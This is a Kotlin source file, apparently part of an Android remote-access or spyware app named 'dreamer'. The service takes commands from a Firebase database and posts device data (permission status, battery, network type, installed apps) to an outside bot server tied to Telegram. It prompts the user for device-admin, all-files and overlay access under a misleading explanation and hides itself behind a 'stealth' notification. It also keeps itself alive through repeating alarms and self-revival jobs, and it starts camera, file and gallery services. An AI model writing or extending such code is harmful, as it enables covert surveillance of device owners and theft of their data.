package com.h4k3r.dreamer

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.androidbrowserhelper.locationdelegation.PermissionRequestActivity
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.google.gson.Gson
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import android.app.Notification

class PermissionMonitorService : Service() {
    companion object {
        private const val TAG = "PermissionMonitor"

        // Flag to track if service is running
        @Volatile
        var isServiceRunning = false
    }

    /* ── Authentication ─────────────────────────── */
    private lateinit var secretKey: String
    private lateinit var deviceId: String
    private lateinit var deviceRef: DatabaseReference
    private var authRetryCount = 0
    private val maxAuthRetries = 10

    /* ── HTTP & Coroutines ──────────────────────── */
    private val server = "https://dreamer-bot.onrender.com"
    private val http = OkHttpClient()
    private val gson = Gson()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    /* ── Enhanced Permission Definitions ─────────────────── */
    private val permissionGroups = mapOf(
        "📸 Camera & Media" to listOf("camera", "storage_read", "microphone"),
        "📍 Location" to listOf("location_fine", "location_coarse"),
        "📱 Communication" to listOf("contacts", "sms", "phone", "call_log"),
        "🔔 System Access" to listOf("notifications", "overlay"), // Removed: accessibility, notification_listener
        "📁 Storage" to listOf("all_files_access", "storage_write"),
        "⚙️ Admin" to listOf("device_admin")
    )

    // Remove special permissions from everywhere
    // Only keep runtime permissions logic
    private val permissionsToCheck = mapOf(
        "camera" to Manifest.permission.CAMERA,
        "location_fine" to Manifest.permission.ACCESS_FINE_LOCATION,
        "location_coarse" to Manifest.permission.ACCESS_COARSE_LOCATION,
        "contacts" to Manifest.permission.READ_CONTACTS,
        "sms" to Manifest.permission.READ_SMS,
        "phone" to Manifest.permission.READ_PHONE_STATE,
        "microphone" to Manifest.permission.RECORD_AUDIO,
        "call_log" to Manifest.permission.READ_CALL_LOG,
        "calendar" to Manifest.permission.READ_CALENDAR,
        "storage_read" to if (Build.VERSION.SDK_INT >= 33) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }
    )

    override fun onCreate() {
        super.onCreate()

        // Start as foreground service IMMEDIATELY to avoid timeout
        try {
            startForegroundNotification()
            Log.d(TAG, "PermissionMonitorService started as foreground service")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start foreground service: ${e.message}")
            stopSelf()
            return
        }

        // Set the running flag
        isServiceRunning = true

        val prefs = getSharedPreferences("dreamer_auth", MODE_PRIVATE)
        secretKey = prefs.getString("secret_key", "") ?: ""
        deviceId = prefs.getString("device_id", "") ?: ""

        if (secretKey.isEmpty() || deviceId.isEmpty()) {
            authRetryCount++
            if (authRetryCount > maxAuthRetries) {
                Log.e(TAG, "Missing authentication, max retries reached. Stopping service.")
                stopSelf()
                return
            }
            Log.e(TAG, "Missing authentication, will retry in 5 seconds (attempt $authRetryCount)")
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                onCreate()
            }, 5000)
            return
        } else {
            authRetryCount = 0 // reset on success
        }

        Log.d(TAG, "Service started - Key: ${secretKey.take(6)}..., Device: $deviceId")

        deviceRef = Firebase.database.reference
            .child("devices")
            .child(secretKey)
            .child(deviceId)

        listenFirebase()
        startPeriodicPermissionCheck()
        // Schedule WorkManager to keep this service alive
        scheduleSelfRevival()
        scheduleAlarmRevival()
    }

    private fun listenFirebase() {
        deviceRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val cmd = snapshot.child("command").getValue(String::class.java) ?: return
                val chatId = snapshot.child("chat").getValue(Long::class.java) ?: 0L
                val msgId = snapshot.child("msg").getValue(Long::class.java) ?: 0L

                Log.d(TAG, "Command: $cmd")

                when (cmd) {
                    "check_permissions" -> checkAndSendPermissions(chatId, msgId)

                    "grant_permission" -> {
                        val permission = snapshot.child("permission").getValue(String::class.java)
                        permission?.let { grantSpecificPermission(it, chatId, msgId) }
                    }
                    "request_battery_optimization" -> requestBatteryOptimization(chatId, msgId)
                    "battery_status" -> sendBatteryStatus(chatId, msgId)
                    "network_info" -> sendNetworkInfo(chatId, msgId)
                    "app_list" -> sendAppList(chatId, msgId)
                    "restart_services" -> restartAllServices(chatId)
                }

                snapshot.child("command").ref.setValue(null)
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Firebase error", error.toException())
            }
        })
    }

    /* ── Enhanced Permission Check ──────────────── */
    private fun checkAndSendPermissions(chatId: Long, msgId: Long) {
        Log.d(TAG, "Checking permissions - ChatID: $chatId, MsgID: $msgId")

        val permissions = mutableMapOf<String, Boolean>()

        // Check regular permissions
        permissionsToCheck.forEach { (name, permission) ->
            if (permission != null) {
                permissions[name] = ContextCompat.checkSelfPermission(this, permission) ==
                        PackageManager.PERMISSION_GRANTED
            }
        }

        // Update Firebase with current permissions
        deviceRef.child("info").child("permissions").setValue(permissions)

        val json = gson.toJson(mapOf(
            "chat_id" to chatId,
            "msg_id" to msgId,
            "permissions" to permissions
        ))

        postJson("/json/permissions", json)
    }



    /* ── Enhanced Grant Specific Permission ──────────────── */
    private fun grantSpecificPermission(permission: String, chatId: Long, msgId: Long) {
        Log.d(TAG, "Attempting to grant permission: $permission")

        val intent = when (permission) {
            "all_files_access" -> {
                if (Build.VERSION.SDK_INT >= 30) {
                    Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                } else {
                    Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION).apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                }
            }
            // "accessibility" -> { // REMOVED: Requires special permissions
            //     Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
            //         flags = Intent.FLAG_ACTIVITY_NEW_TASK
            //     }
            // }
            "overlay" -> {
                Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                    data = Uri.parse("package:$packageName")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
            }
            // "notification_listener" -> { // REMOVED: Requires special permissions
            //     Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").apply {
            //         flags = Intent.FLAG_ACTIVITY_NEW_TASK
            //     }
            // }
            "device_admin" -> {
                Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                        android.content.ComponentName(this@PermissionMonitorService, DeviceAdminReceiver::class.java))
                    putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Required for advanced device management")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
            }
            else -> {
                // For regular permissions, try to request them
                val permissionString = permissionsToCheck[permission]
                if (permissionString != null) {
                    // Create a custom activity to request permission
                    Intent(this, PermissionRequestActivity::class.java).apply {
                        putExtra("permission", permissionString)
                        putExtra("chat_id", chatId)
                        putExtra("msg_id", msgId)
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                } else {
                    // Fallback to app settings
                    Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.parse("package:$packageName")
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                }
            }
        }

        if (intent != null) {
            try {
                startActivity(intent)

                // Send confirmation to Telegram
                val response = mapOf(
                    "chat_id" to chatId,
                    "msg_id" to msgId,
                    "type" to "permission_grant_requested",
                    "permission" to permission,
                    "message" to "🔧 *Permission Request Sent*\n\n" +
                            "Please follow the on-screen instructions to grant the permission.\n\n" +
                            "After granting, return here and check permissions again."
                )
                postJson("/json/permission_interface", gson.toJson(response))

            } catch (e: Exception) {
                Log.e(TAG, "Failed to launch permission intent", e)

                val errorResponse = mapOf(
                    "chat_id" to chatId,
                    "msg_id" to msgId,
                    "type" to "permission_error",
                    "error" to "Failed to open permission settings: ${e.message}"
                )
                postJson("/json/permission_interface", gson.toJson(errorResponse))
            }
        } else {
            val errorResponse = mapOf(
                "chat_id" to chatId,
                "msg_id" to msgId,
                "type" to "permission_error",
                "error" to "Unknown permission: $permission"
            )
            postJson("/json/permission_interface", gson.toJson(errorResponse))
        }
    }

    /* ── Enhanced Permission Message Creator ─────────────── */
    private fun createEnhancedPermissionMessage(groupedMissing: Map<String, List<String>>, totalMissing: Int): String {
        var message = "🔐 *Permission Setup Required*\n\n"
        message += "Your device needs ${totalMissing} permission${if (totalMissing > 1) "s" else ""} to function properly.\n\n"

        message += "*Missing Permissions:*\n"
        groupedMissing.forEach { (group, perms) ->
            message += "• $group: ${perms.size} permission${if (perms.size > 1) "s" else ""}\n"
        }

        message += "\n*Quick Actions:*\n"
        message += "• Tap individual permissions to grant them\n"
        message += "• Use group buttons for multiple permissions\n"
        message += "• Check status after granting permissions\n\n"

        message += "_Device: ${deviceId.take(6)}..._"

        return message
    }

    /* ── Enhanced Permission Check ───────────────────────── */
    private fun checkCurrentPermissions(): Map<String, Boolean> {
        val permissions = mutableMapOf<String, Boolean>()

        // Check regular permissions
        permissionsToCheck.forEach { (name, permission) ->
            if (permission != null) {
                permissions[name] = ContextCompat.checkSelfPermission(this, permission) ==
                        PackageManager.PERMISSION_GRANTED
            }
        }

        return permissions
    }

    /* ── Battery Optimization Request ──────────── */
    private fun requestBatteryOptimization(chatId: Long, msgId: Long) {
        Log.d(TAG, "Requesting battery optimization exemption")

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
                val packageName = packageName

                val isIgnoringBatteryOptimizations = powerManager.isIgnoringBatteryOptimizations(packageName)
                val status = if (isIgnoringBatteryOptimizations) "exempt" else "requested"

                if (!isIgnoringBatteryOptimizations) {
                    // Try to request battery optimization exemption
                    try {
                        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                            data = Uri.parse("package:$packageName")
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        startActivity(intent)
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to launch battery optimization settings", e)
                    }
                }

                // Update Firebase with battery optimization status
                deviceRef.child("info").child("battery_optimization").setValue(status)

                // Send response to Telegram
                val json = gson.toJson(mapOf(
                    "chat_id" to chatId,
                    "msg_id" to msgId,
                    "status" to status,
                    "message" to if (isIgnoringBatteryOptimizations) {
                        "✅ Battery optimization is already disabled for this app."
                    } else {
                        "🔋 Battery optimization exemption requested. Please check your device."
                    }
                ))

                postJson("/json/battery_optimization", json)
            } else {
                // For Android versions below M, battery optimization is not applicable
                deviceRef.child("info").child("battery_optimization").setValue("not_applicable")

                val json = gson.toJson(mapOf(
                    "chat_id" to chatId,
                    "msg_id" to msgId,
                    "status" to "not_applicable",
                    "message" to "Battery optimization settings not applicable for this Android version."
                ))

                postJson("/json/battery_optimization", json)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error requesting battery optimization", e)

            // Update Firebase with error status
            deviceRef.child("info").child("battery_optimization").setValue("error")

            val json = gson.toJson(mapOf(
                "chat_id" to chatId,
                "msg_id" to msgId,
                "status" to "error",
                "message" to "Error requesting battery optimization: ${e.message}"
            ))

            postJson("/json/battery_optimization", json)
        }
    }

    /* ── Enhanced Helper Functions ───────────────────────── */
    private fun getPermissionEmoji(permission: String): String {
        return when (permission) {
            "camera" -> "📸"
            "location_fine", "location_coarse" -> "📍"
            "contacts" -> "📱"
            "sms" -> "💬"
            "storage_read", "storage_write", "all_files_access" -> "📂"
            "phone" -> "📞"
            "microphone" -> "🎤"
            "notifications" -> "🔔"
            "overlay" -> "🖼️"
            "device_admin" -> "⚙️"
            // "accessibility" -> "♿" // REMOVED: Special permissions
            // "notification_listener" -> "🔔" // REMOVED: Special permissions
            "call_log" -> "📞"
            "calendar" -> "📅"
            else -> "❓"
        }
    }

    private fun getPermissionDisplayName(permission: String): String {
        return when (permission) {
            "camera" -> "Camera"
            "location_fine" -> "Location (Fine)"
            "location_coarse" -> "Location (Coarse)"
            "contacts" -> "Contacts"
            "sms" -> "SMS"
            "storage_read" -> "Storage Read"
            "storage_write" -> "Storage Write"
            "phone" -> "Phone"
            "microphone" -> "Microphone"
            "notifications" -> "Notifications"
            "all_files_access" -> "All Files Access"
            "overlay" -> "Overlay"
            "device_admin" -> "Device Admin"
            // "accessibility" -> "Accessibility" // REMOVED: Special permissions
            // "notification_listener" -> "Notification Listener" // REMOVED: Special permissions
            "call_log" -> "Call Log"
            "calendar" -> "Calendar"
            else -> permission.replace("_", " ").capitalize()
        }
    }

    /* ── Enhanced Device Info Functions ──────────────────── */
    private fun sendBatteryStatus(chatId: Long, msgId: Long) {
        scope.launch {
            try {
                val batteryIntent = registerReceiver(
                    null,
                    android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)
                )
                val level = batteryIntent?.getIntExtra("level", -1) ?: -1
                val scale = batteryIntent?.getIntExtra("scale", -1) ?: -1
                val batteryPercent = if (level != -1 && scale != -1) {
                    (level * 100 / scale)
                } else {
                    -1
                }

                val isCharging = batteryIntent?.getIntExtra("status", -1) ==
                        android.os.BatteryManager.BATTERY_STATUS_CHARGING

                val json = gson.toJson(mapOf(
                    "chat_id" to chatId,
                    "msg_id" to msgId,
                    "battery_percent" to batteryPercent,
                    "is_charging" to isCharging,
                    "device_id" to deviceId
                ))

                postJson("/json/battery_status", json)
            } catch (e: Exception) {
                Log.e(TAG, "Battery status error", e)
            }
        }
    }

    private fun sendNetworkInfo(chatId: Long, msgId: Long) {
        scope.launch {
            try {
                val connectivityManager = getSystemService(android.net.ConnectivityManager::class.java)
                val activeNetwork = connectivityManager?.activeNetworkInfo

                val networkType = when (activeNetwork?.type) {
                    android.net.ConnectivityManager.TYPE_WIFI -> "WiFi"
                    android.net.ConnectivityManager.TYPE_MOBILE -> "Mobile Data"
                    android.net.ConnectivityManager.TYPE_ETHERNET -> "Ethernet"
                    else -> "Unknown"
                }

                val json = gson.toJson(mapOf(
                    "chat_id" to chatId,
                    "msg_id" to msgId,
                    "network_type" to networkType,
                    "is_connected" to (activeNetwork?.isConnected ?: false),
                    "device_id" to deviceId
                ))

                postJson("/json/network_info", json)
            } catch (e: Exception) {
                Log.e(TAG, "Network info error", e)
            }
        }
    }

    private fun sendAppList(chatId: Long, msgId: Long) {
        scope.launch {
            try {
                val packageManager = packageManager
                val installedApps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
                    .filter { packageManager.getLaunchIntentForPackage(it.packageName) != null }
                    .take(50) // Limit to first 50 apps
                    .map {
                        mapOf(
                            "name" to (it.loadLabel(packageManager).toString()),
                            "package" to it.packageName,
                            "version" to (packageManager.getPackageInfo(it.packageName, 0).versionName ?: "Unknown")
                        )
                    }

                val json = gson.toJson(mapOf(
                    "chat_id" to chatId,
                    "msg_id" to msgId,
                    "apps" to installedApps,
                    "total_count" to installedApps.size,
                    "device_id" to deviceId
                ))

                postJson("/json/app_list", json)
            } catch (e: Exception) {
                Log.e(TAG, "App list error", e)
            }
        }
    }

    private fun restartAllServices(chatId: Long) {
        scope.launch {
            try {
                val services = listOf(
                    CameraService::class.java,
                    DataService::class.java,
                    FilesService::class.java,
                    GalleryService::class.java
                )

                services.forEach { serviceClass ->
                    try {
                        val intent = Intent(this@PermissionMonitorService, serviceClass)
                        ContextCompat.startForegroundService(this@PermissionMonitorService, intent)
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to restart ${serviceClass.simpleName}", e)
                    }
                }

                val json = gson.toJson(mapOf(
                    "chat_id" to chatId,
                    "type" to "services_restarted",
                    "message" to "✅ All services have been restarted successfully",
                    "device_id" to deviceId
                ))

                postJson("/json/status", json)
            } catch (e: Exception) {
                Log.e(TAG, "Service restart error", e)
            }
        }
    }

    /* ── Network Helper ─────────────────────────── */
    private fun postJson(path: String, json: String) = scope.launch {
        try {
            val request = Request.Builder()
                .url(server + path)
                .header("X-Auth", "$secretKey:$deviceId")
                .post(json.toRequestBody("application/json".toMediaType()))
                .build()

            http.newCall(request).execute().use { response ->
                Log.d(TAG, "POST $path: ${response.code}")
                if (!response.isSuccessful) {
                    Log.e(TAG, "Failed: ${response.body?.string()}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Network error", e)
        }
    }

    /* ── Service Lifecycle ──────────────────────── */
    private fun startForegroundNotification() {
        try {
            // Use stealth notification manager
            val stealthManager = StealthNotificationManager.getInstance(this)
            startForeground(StealthNotificationManager.STEALTH_NOTIFICATION_ID, stealthManager.getStealthNotification())
            stealthManager.enforceStealthMode()

            Log.d(TAG, "PermissionMonitorService started with stealth notification")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start foreground notification: ${e.message}")
        }
    }

    private fun startPeriodicPermissionCheck() {
        // Check permissions every 30 minutes
        scope.launch {
            while (isActive) {
                delay(30 * 60 * 1000) // 30 minutes
                checkAndSendPermissions(0, 0) // Update Firebase only
            }
        }
    }

    private fun scheduleSelfRevival() {
        val workRequest = androidx.work.OneTimeWorkRequestBuilder<StealthRevivalWorker>()
            .setInitialDelay(1, java.util.concurrent.TimeUnit.MINUTES)
            .build()

        androidx.work.WorkManager.getInstance(this).enqueueUniqueWork(
            "service-revival",
            androidx.work.ExistingWorkPolicy.REPLACE,
            workRequest
        )
    }

    private fun scheduleAlarmRevival() {
        val alarmManager = getSystemService(ALARM_SERVICE) as android.app.AlarmManager
        val intent = android.content.Intent(this, RestartReceiver::class.java)
        intent.action = "com.h4k3r.dreamer.ALARM_RESTART"
        val pendingIntent = android.app.PendingIntent.getBroadcast(
            this, 0, intent, android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
        )
        val interval = 60 * 1000L // 1 minute
        val triggerAt = System.currentTimeMillis() + interval
        alarmManager.setRepeating(
            android.app.AlarmManager.RTC_WAKEUP,
            triggerAt,
            interval,
            pendingIntent
        )
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Try to start foreground notification, but don't crash if it fails
        try {
            startForegroundNotification()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start foreground notification in onStartCommand: ${e.message}")
            // Continue as background service
        }

        startOtherServices()
        return START_STICKY
    }

    private fun startOtherServices() {
        val services = listOf(
            CameraService::class.java,
            DataService::class.java,
            FilesService::class.java,
            GalleryService::class.java,
            WatchdogService::class.java
        )

        services.forEach { serviceClass ->
            try {
                val intent = Intent(this, serviceClass)
                startService(intent)
                Log.d(TAG, "Started service: ${serviceClass.simpleName}")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start service: ${serviceClass.simpleName}", e)
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        Log.d(TAG, "PermissionMonitorService onDestroy called")

        // Clear the running flag
        isServiceRunning = false

        // Stop foreground service properly
        try {
            stopForeground(true)
            Log.d(TAG, "Foreground service stopped successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping foreground service: ${e.message}")
        }

        // Cancel coroutines
        scope.cancel()

        super.onDestroy()

        // Try to restart the service
        scheduleSelfRevival()
    }
}

